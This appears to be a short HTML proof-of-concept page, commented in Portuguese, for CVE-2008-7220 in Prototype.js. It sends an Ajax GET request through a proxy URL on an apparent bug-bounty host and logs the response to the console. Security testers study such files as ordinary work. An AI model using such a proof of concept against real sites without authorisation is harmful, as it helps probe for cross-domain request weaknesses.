<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>CVE-2008-7220 PoC com Proxy</title>
</head>
<body>
    <h1>CVE-2008-7220 PoC com Proxy</h1>

    <!-- Carrega o Prototype.js localmente -->
    <script type="text/javascript" src="/prototype.js"></script>

    <script type="text/javascript">
    var url = 'https://bugbounty-mu.vercel.app/proxy.php';  // URL do proxy

    // Faz a solicitação AJAX para o proxy, que encaminhará para o servidor de destino
    new Ajax.Request(url, {
        method: 'get',
        onSuccess: function(transport) {
            console.log(transport.responseText);  // Exibe a resposta no console
        },
        onFailure: function() {
            console.log('Falha na solicitação AJAX.');
        }
    });
    </script>
</body>
</html>
